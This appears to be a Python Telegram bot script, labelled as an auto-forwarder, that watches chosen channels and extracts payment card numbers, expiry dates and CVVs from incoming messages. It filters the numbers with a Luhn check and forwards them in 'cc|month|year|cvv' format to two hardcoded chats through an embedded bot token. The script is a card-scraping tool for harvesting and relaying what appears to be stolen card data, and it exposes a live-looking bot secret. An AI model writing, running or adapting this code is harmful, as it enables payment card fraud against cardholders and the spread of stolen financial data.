#    Copyright (c) 2021 Ayush
#    
#    This program is free software: you can redistribute it and/or modify  
#    it under the terms of the GNU General Public License as published by  
#    the Free Software Foundation, version 3.
# 
#    This program is distributed in the hope that it will be useful, but 
#    WITHOUT ANY WARRANTY; without even the implied warranty of 
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
#    General Public License for more details.
# 
#    License can be found in < https://github.com/Ayush7445/telegram-auto_forwarder/blob/main/License > .

from telethon import TelegramClient, events
from decouple import config
import logging
import re
import requests
from telethon.sessions import StringSession

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', level=logging.WARNING)

print("Starting...")

def tel(chat_id, text):
    url = f'https://api.telegram.org/bot5719814574:AAFUYpmZWCgc6-u4itMXtnxShBYX4pmSg4Y/sendMessage'
    payload = {
                'chat_id': chat_id,
                'text': text
                }
   
    r = requests.post(url,json=payload)
 
    return r


def checkLuhn(cardNo):
     
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
     
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
     
        if (isSecond == True):
            d = d * 2
  
        # We add two digits to handle
        # cases that make two digits after
        # doubling
        nSum += d // 10
        nSum += d % 10
  
        isSecond = not isSecond
     
    if (nSum % 10 == 0):
        return True
    else:
        return False

# Basics
APP_ID = config("APP_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
SESSION = config("SESSION")
FROM_ = config("FROM_CHANNEL")
TO_ = config("TO_CHANNEL")

FROM = [int(i) for i in FROM_.split()]
TO = [int(i) for i in TO_.split()]

try:
    BotzHubUser = TelegramClient(StringSession(SESSION), APP_ID, API_HASH)
    BotzHubUser.start()
except Exception as ap:
    print(f"ERROR - {ap}")
    exit(1)

@BotzHubUser.on(events.NewMessage(incoming=True, chats=FROM))
async def sender_bH(event):
    for i in TO:
        try:
            med = event.message.message
            text = med.replace('\n',' ').replace('\r',' ')
            input = re.findall(r"[0-9]+", text)
            if not input or len(input) < 3:
                return
            if len(input) == 3:
                cc = input[0]
                if not checkLuhn(cc): return
                if len(input[1]) == 3:
                    mes = input[2][:2]
                    ano = input[2][2:]
                    cvv = input[1]
                else:
                    mes = input[1][:2]
                    ano = input[1][2:]
                    cvv = input[2]
            else:
                cc = input[0]
                if len(input[1]) == 3:
                    mes = input[2]
                    ano = input[3]
                    cvv = input[1]
                else:
                    mes = input[1]
                    ano = input[2]
                    cvv = input[3]
                if  len(mes) == 2 and (mes > '12' or mes < '01'):
                    ano1 = mes
                    mes = ano
                    ano = ano1
                if cc[0] == 3 and len(cc) != 15 or len(cc) != 16 or int(cc[0]) not in [2,3,4,5,6]:
                 return
                if len(mes) not in [2 , 4] or len(mes) == 2 and mes > '12' or len(mes) == 2 and mes < '01':
                 return
                if cc[0] == 3 and len(cvv) != 4 or len(cvv) != 3:
                 return 
                if (cc,mes,ano ,cvv):
                 if len(ano) == 2:
                    ano = "20"+ str(ano)
                 cc = f'{cc}|{mes}|{ano}|{cvv}'
            send = tel('-1001663590473',cc)
            send = tel('-1001839223665',cc)
            print(send)
        except Exception as e:
            print(e)

print("Bot has started.")
BotzHubUser.run_until_disconnected()
